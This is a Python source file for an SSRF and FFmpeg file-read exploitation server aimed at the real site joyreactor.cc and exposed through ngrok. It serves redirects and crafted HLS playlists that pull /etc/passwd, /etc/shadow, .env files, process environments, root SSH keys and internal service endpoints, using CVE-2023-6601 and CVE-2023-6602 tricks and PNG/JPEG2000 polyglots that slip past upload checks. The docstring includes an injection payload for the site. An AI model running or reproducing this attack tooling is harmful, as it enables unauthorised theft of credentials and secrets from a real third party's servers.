#!/usr/bin/env python3
"""
SSRF exfiltration server for joyreactor.cc — run locally, expose via ngrok.

Usage:
  python3 ssrf_server.py         # starts on :8080
  ngrok http 8080                # expose publicly

Endpoints:
  /redirect/file   → 302 → file:///etc/passwd   (test HTTP→file redirect bypass)
  /redirect/env    → 302 → file:///var/www/html/.env
  /redirect/3000   → 302 → http://127.0.0.1:3000/
  /redirect/3001   → 302 → http://127.0.0.1:3001/
  /evil.m3u8       → HLS playlist with file:// segments (exfiltration attempt)
  /evil-key.m3u8   → HLS with AES key pointing to file:// (key redirect)
  /log             → shows all received requests (for callbacks)

After starting, use ssrf_probe.py or run probes manually:
  mutation { post(tags:[], text:"<img src=https://YOUR.ngrok.app/redirect/file>") { post { id } } }
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse, json, datetime, os, secrets

LOG = []
LOG_SECRET = os.environ.get("LOG_SECRET", secrets.token_hex(16))
print(f"[*] /log token: {LOG_SECRET}  (set LOG_SECRET env var to fix)")

TARGETS = {
    "file":    "file:///etc/passwd",
    "env":     "file:///var/www/html/.env",
    "env2":    "file:///var/www/.env",
    "env3":    "file:///app/.env",
    "hosts":   "file:///etc/hosts",
    "shadow":  "file:///etc/shadow",
    "cron":    "file:///etc/crontab",
    "sshkeys": "file:///root/.ssh/authorized_keys",
    "proc":    "file:///proc/self/environ",
    "maps":    "file:///proc/self/maps",
    "version": "file:///proc/version",
    "cmdline": "file:///proc/self/cmdline",
    "exe":     "file:///proc/self/exe",
    "3000":          "http://127.0.0.1:3000/",
    "3000-metrics":  "http://127.0.0.1:3000/metrics",
    "3000-health":   "http://127.0.0.1:3000/api/health",
    "3000-info":     "http://127.0.0.1:3000/info",
    "3000-version":  "http://127.0.0.1:3000/version",
    "3000-status":   "http://127.0.0.1:3000/status",
    "3000-debug":    "http://127.0.0.1:3000/debug/vars",
    "3001":          "http://127.0.0.1:3001/",
    "3001-metrics":  "http://127.0.0.1:3001/metrics",
    "3001-health":   "http://127.0.0.1:3001/api/health",
    "redis":         "http://127.0.0.1:6379/",
    "mysql":         "http://127.0.0.1:3306/",
}

EVIL_M3U8 = b"""#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:1
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0,
file:///etc/passwd
#EXTINF:1.0,
file:///var/www/html/.env
#EXTINF:1.0,
file:///proc/self/environ
#EXT-X-ENDLIST
"""

# HLS with AES key pointing to our /keyfile endpoint
# FFmpeg fetches the "key" URL — we redirect it to file:///etc/passwd
# FFmpeg reads first 16 bytes as AES key, rest is ignored
EVIL_KEY_M3U8_TEMPLATE = """#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:1
#EXT-X-MEDIA-SEQUENCE:0
#EXT-X-KEY:METHOD=AES-128,URI="{base}/keyfile/env",IV=0x00000000000000000000000000000001
#EXTINF:1.0,
{base}/segment.ts
#EXT-X-ENDLIST
"""

# CVE-2023-6601: data URI with .m3u8 extension bypass
# The inner m3u8 is base64-encoded and appended with .m3u8 extension
# FFmpeg checks extension (.m3u8) but ignores data: URI scheme → runs HLS demuxer on decoded content
import base64

def make_cve_2023_6601_m3u8(target_file):
    """Outer m3u8 served from our server. Inner m3u8 (base64) references target_file via CVE-2023-6601."""
    inner = (
        f"#EXTM3U\n"
        f"#EXT-X-VERSION:3\n"
        f"#EXT-X-MEDIA-SEQUENCE:0\n"
        f"#EXTINF:1.0,\n"
        f"{target_file}\n"
        f"#EXT-X-ENDLIST\n"
    )
    b64 = base64.b64encode(inner.encode()).decode()
    return (
        f"#EXTM3U\n"
        f"#EXT-X-VERSION:3\n"
        f"#EXT-X-TARGETDURATION:1\n"
        f"#EXT-X-MEDIA-SEQUENCE:0\n"
        f"#EXTINF:1.0,\n"
        f"data:application/x-mpegURL;base64,{b64}.m3u8\n"
        f"#EXT-X-ENDLIST\n"
    ).encode()

# CVE-2023-6602: TTY demuxer — .ans segment followed by file:// segments
# First .ans segment sets demuxer context; subsequent file:// segments processed by same TTY demuxer
def make_cve_2023_6602_m3u8(target_file):
    return (
        f"#EXTM3U\n"
        f"#EXT-X-VERSION:3\n"
        f"#EXT-X-TARGETDURATION:1\n"
        f"#EXT-X-MEDIA-SEQUENCE:0\n"
        f"#EXTINF:1.0,\n"
        f"data:text/plain;base64,Cg==.ans\n"
        f"#EXTINF:1.0,\n"
        f"{target_file}\n"
        f"#EXT-X-ENDLIST\n"
    ).encode()

# Minimal valid MPEG-TS segment (188 bytes, null packets)
TS_SEGMENT = bytes([0x47, 0x1F, 0xFF, 0x10] + [0xFF] * 184)


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        entry = {
            "time": datetime.datetime.now().isoformat(),
            "method": self.command,
            "path": self.path,
            "ua": self.headers.get("User-Agent", ""),
            "headers": dict(self.headers),
        }
        LOG.append(entry)
        print(f"[{entry['time']}] {self.command} {self.path} | UA: {entry['ua'][:60]}")

    def do_GET(self):
        path = self.path.split("?")[0].rstrip("/")

        # ── /redirect/<target> — 302 to arbitrary URL ────────────────────────
        if path.startswith("/redirect/"):
            key = path[len("/redirect/"):]
            dest = TARGETS.get(key)
            if dest:
                self.send_response(302)
                self.send_header("Location", dest)
                self.end_headers()
                print(f"  → redirecting to: {dest}")
            else:
                self._404(f"unknown target '{key}'. Available: {list(TARGETS)}")
            return

        # ── /keyfile/<target> — redirect to file:// (for AES key trick) ──────
        if path.startswith("/keyfile/"):
            key = path[len("/keyfile/"):]
            dest = TARGETS.get(key, TARGETS["file"])
            self.send_response(302)
            self.send_header("Location", dest)
            self.end_headers()
            print(f"  → key redirect to: {dest}")
            return

        # ── /evil.m3u8 — HLS playlist with file:// segments ──────────────────
        if path == "/evil.m3u8":
            self.send_response(200)
            self.send_header("Content-Type", "application/x-mpegURL")
            self.end_headers()
            self.wfile.write(EVIL_M3U8)
            return

        # ── /evil-key.m3u8 — HLS with AES key trick ──────────────────────────
        if path == "/evil-key.m3u8":
            base = f"http://{self.headers.get('Host', 'localhost:8080')}"
            content = EVIL_KEY_M3U8_TEMPLATE.format(base=base).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/x-mpegURL")
            self.end_headers()
            self.wfile.write(content)
            return

        # ── /segment.ts — dummy TS segment ───────────────────────────────────
        if path == "/segment.ts":
            self.send_response(200)
            self.send_header("Content-Type", "video/MP2T")
            self.end_headers()
            self.wfile.write(TS_SEGMENT * 10)
            return

        # ── /cve-6601/<target> — CVE-2023-6601: data URI m3u8 bypass ────────────
        if path.startswith("/cve-6601/"):
            key = path[len("/cve-6601/"):]
            target = TARGETS.get(key)
            if not target:
                self._404(f"unknown target '{key}'")
                return
            content = make_cve_2023_6601_m3u8(target)
            print(f"  → CVE-2023-6601 m3u8 targeting: {target}")
            self.send_response(200)
            self.send_header("Content-Type", "application/x-mpegURL")
            self.end_headers()
            self.wfile.write(content)
            return

        # ── /cve-6602/<target> — CVE-2023-6602: TTY demuxer exfiltration ─────
        if path.startswith("/cve-6602/"):
            key = path[len("/cve-6602/"):]
            target = TARGETS.get(key)
            if not target:
                self._404(f"unknown target '{key}'")
                return
            content = make_cve_2023_6602_m3u8(target)
            print(f"  → CVE-2023-6602 m3u8 targeting: {target}")
            self.send_response(200)
            self.send_header("Content-Type", "application/x-mpegURL")
            self.end_headers()
            self.wfile.write(content)
            return

        # ── /exploit.jp2 or /exploit.jpg — CVE-2025-9951 malicious JPEG2000 ──────
        # Serve as .jpg to bypass PHP extension whitelist; FFmpeg reads magic bytes
        # ── /test-png — valid PNG magic, garbage content ──────────────────────────
        if path == "/test-png":
            # PNG magic bytes + random garbage — PHP should accept, FFmpeg should fail
            data = b'\x89PNG\r\n\x1a\n' + b'\x00' * 200
            self.send_response(200)
            self.send_header("Content-Type", "image/png")
            self.end_headers()
            self.wfile.write(data)
            print("  → served fake PNG")
            return

        # ── /jp2-in-png — JP2 data with PNG magic prefix ──────────────────────────
        if path == "/jp2-in-png":
            jp2_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "exploit.jp2")
            jp2_data = open(jp2_path, 'rb').read() if os.path.exists(jp2_path) else b''
            # Prepend PNG magic to trick PHP's getimagesize(), body is JP2
            data = b'\x89PNG\r\n\x1a\n' + jp2_data
            self.send_response(200)
            self.send_header("Content-Type", "image/png")
            self.end_headers()
            self.wfile.write(data)
            print(f"  → served JP2-in-PNG polyglot ({len(data)} bytes)")
            return

        if path in ("/exploit.jp2", "/exploit.jpg", "/exploit", "/img"):
            jp2_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "exploit.jp2")
            if os.path.exists(jp2_path):
                data = open(jp2_path, 'rb').read()
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
                print(f"  → served exploit.jp2 ({len(data)} bytes)")
            else:
                self._404("exploit.jp2 not found — run gen_exploit_jp2.py first")
            return

        # ── /log — show all hits (token-protected) ───────────────────────────
        if path == "/log":
            qs = urllib.parse.parse_qs(self.path.split("?", 1)[1] if "?" in self.path else "")
            token = qs.get("token", [""])[0]
            if not secrets.compare_digest(token, LOG_SECRET):
                self.send_response(403)
                self.end_headers()
                self.wfile.write(b"Forbidden. Use /log?token=<LOG_SECRET>")
                return
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(LOG, indent=2).encode())
            return

        self._404("not found")

    def _404(self, msg):
        self.send_response(404)
        self.end_headers()
        self.wfile.write(msg.encode())


if __name__ == "__main__":
    port = 8080
    print(f"[*] SSRF server listening on :{port}")
    print(f"[*] Endpoints:")
    for k in TARGETS:
        print(f"      /redirect/{k}  →  {TARGETS[k]}")
    print(f"      /evil.m3u8      — HLS file:// segments")
    print(f"      /evil-key.m3u8  — HLS AES key trick")
    print(f"      /log            — request log")
    print()
    HTTPServer(("0.0.0.0", port), Handler).serve_forever()
